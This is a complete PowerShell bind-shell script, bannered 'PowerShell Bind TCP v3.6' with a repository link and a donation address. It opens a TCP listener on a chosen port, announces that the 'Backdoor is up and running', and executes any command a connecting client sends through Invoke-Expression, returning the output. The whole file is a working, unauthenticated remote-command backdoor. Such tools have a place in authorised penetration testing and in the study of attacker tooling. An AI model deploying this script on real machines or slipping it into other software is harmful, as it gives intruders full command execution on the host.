$p = $(Read-Host -Prompt "Enter port number").Trim(); Write-Host ""; if ($p.Length -lt 1) { Write-Host "Port number is required"; } else { Write-Host "#######################################################################`n#                                                                     #`n#                         PowerShell Bind TCP v3.6                    #`n#                                        by Ivan Sincek               #`n#                                                                     #`n# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp. #`n# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.  #`n#                                                                     #`n#######################################################################"; $l = $c = $t = $b = $w = $d = $r = $null; try { $l = New-Object Net.Sockets.TcpListener("0.0.0.0", $p); $l.Start(); Write-Host "Backdoor is up and running..."; Write-Host ""; Write-Host "Waiting for client to connect..."; Write-Host ""; do { if ($l.Pending()) { $c = $l.AcceptTcpClient(); } else { Start-Sleep -Milliseconds 500; } } while ($c -eq $null); $l.Stop(); $t = $c.GetStream(); $b = New-Object Byte[] 1024; $e = New-Object Text.AsciiEncoding; $w = New-Object IO.StreamWriter($t); $w.AutoFlush = $true; Write-Host "Client has connected!"; Write-Host ""; $by = 0; do { $w.Write("PS>"); do { $by = $t.Read($b, 0, $b.Length); if ($by -gt 0) { $d = $d + $e.GetString($b, 0, $by); } } while ($t.DataAvailable); if ($by -gt 0) { $d = $d.Trim(); if ($d.Length -gt 0) { try { $r = Invoke-Expression -Command $d 2>&1 | Out-String; } catch { $r = $_.Exception | Out-String; } Clear-Variable -Name "d"; $le = $r.Length; $co = 0; $by = $b.Length; while ($le -gt 0) { if ($le -lt $b.Length) { $by = $le; } $w.Write($r.substring($co, $by)); $co += $by; $le -= $by; } Clear-Variable -Name "r"; } } } while ($by -gt 0); Write-Host "Client has disconnected!"; } catch { Write-Host $_.Exception.InnerException.Message; } finally { if ($l -ne $null) { $l.Server.Close(); $l.Server.Dispose(); Clear-Variable -Name "l"; } if ($w -ne $null) { $w.Close(); $w.Dispose(); Clear-Variable -Name "w"; } if ($t -ne $null) { $t.Close(); $t.Dispose(); Clear-Variable -Name "t"; } if ($c -ne $null) { $c.Close(); $c.Dispose(); Clear-Variable -Name "c"; } if ($b -ne $null) { $b.Clear(); Clear-Variable -Name "b"; } if ($r -ne $null) { Clear-Variable -Name "r"; } if ($d -ne $null) { Clear-Variable -Name "d"; } [System.GC]::Collect(); } }
